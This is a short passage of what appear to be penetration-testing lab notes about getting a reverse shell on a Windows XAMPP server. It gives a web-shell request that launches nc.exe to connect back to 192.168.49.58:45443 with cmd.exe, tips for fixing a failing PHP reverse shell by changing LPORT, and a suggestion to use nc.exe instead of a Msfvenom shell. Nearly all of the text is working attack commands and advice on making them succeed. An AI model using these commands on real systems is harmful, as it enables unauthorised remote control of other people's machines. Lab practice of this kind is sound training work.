

```bash
cmd.php?cmd=powershell.exe -c "c:\xampp\htdocs\nc.exe 192.168.49.58 45443 -e 'cmd.exe'"
```

If you get the error below, change the LPORT variable of your exploit. For example, try using a port you discovered was open during the reconnaissance phase. 
```
/*
Warning: fread() expects parameter 1 to be resource, bool given in C:\xampp\htdocs\rshell.php on line 74

Warning: fclose() expects parameter 1 to be resource, bool given in C:\xampp\htdocs\rshell.php on line 89
```

To upgrade your shell to a fully-functional PTY on Windows, try using nc.exe instead of a Msfvenom reverse shell. 